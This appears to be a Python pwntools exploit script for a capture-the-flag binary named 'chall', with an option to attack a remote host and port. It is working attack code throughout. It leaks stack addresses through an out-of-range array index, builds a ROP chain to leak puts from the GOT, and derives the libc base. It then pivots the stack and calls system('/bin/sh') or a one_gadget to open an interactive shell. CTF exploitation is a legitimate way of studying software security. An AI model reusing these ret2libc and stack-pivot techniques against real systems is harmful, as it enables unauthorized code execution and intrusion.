from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "13.231.207.73"
PORT = 9005 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc-2.23.so')
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	gadget = [0x4f2c5, 0x4f322, 0x10a38c] 

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"]

plt_puts = elf.plt["puts"]
plt_read = elf.plt["read"]

addr_main = elf.symbols["main"]
addr_bss  = elf.bss()
addr_start = elf.symbols["_start"]
addr_calc = elf.symbols["calc_sum"]
addr_dtor = 0x600e18

only_ret = 0x400646
leave_ret = 0x400849
rsi_r15_ret = 0x400a81
rdi_ret = 0x400a83

off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search("/bin/sh"))

#main_addr = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	n = 22 
	conn.sendlineafter("n = ", str(n))
	for i in range(14):
		conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(20)) # i
	conn.sendlineafter(" = ", str(addr_start))
	conn.recvuntil(" = ")
	sm = int(conn.recvline())
	if sm < 0:
		print "negative"
		return
	# sm = 14 + 14 + array + canary + oldrbp(array+0xb0) + addr_start 
	s1 = sm - 0xb0
	
	conn.sendlineafter("n = ", str(n))
	for i in range(14):
		conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(17)) # i
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(addr_start))
	conn.recvuntil(" = ")
	sm = int(conn.recvline())
	# sm = 14 + 14 + array-0xe0 + canary + addr_start 
	s2 = sm + 0xe0
	array = s1 - s2
	
	conn.sendlineafter("n = ", str(n))
	conn.sendlineafter(" = ", str(0)) #fake oldrbp 
	conn.sendlineafter(" = ", str(rdi_ret)) 
	conn.sendlineafter(" = ", str(got_puts)) 
	conn.sendlineafter(" = ", str(plt_puts)) 
	conn.sendlineafter(" = ", str(only_ret)) 
	conn.sendlineafter(" = ", str(addr_start))
	for i in range(14-6):
		conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(17)) # i
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(array - 0xe0*2))
	conn.sendlineafter(" = ", str(leave_ret))
	conn.recvline()
	libc_puts = u64(conn.recvline()[:-1]+"\x00\x00")
	libc_base = libc_puts - off_puts
	libc_binsh = libc_base + off_binsh
	libc_system = libc_base + off_system
	one_gadget = libc_base + gadget[2]
	print hex(libc_base)

	conn.sendlineafter("n = ", str(n))
	conn.sendlineafter(" = ", str(0)) #fake oldrbp 
	conn.sendlineafter(" = ", str(rdi_ret)) 
	conn.sendlineafter(" = ", str(libc_binsh)) 
	conn.sendlineafter(" = ", str(libc_system)) 
	for i in range(14-4):
		conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(17)) # i
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(0))
	conn.sendlineafter(" = ", str(array - 0xe0*2-0xd0+0x30))
	conn.sendlineafter(" = ", str(one_gadget))

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
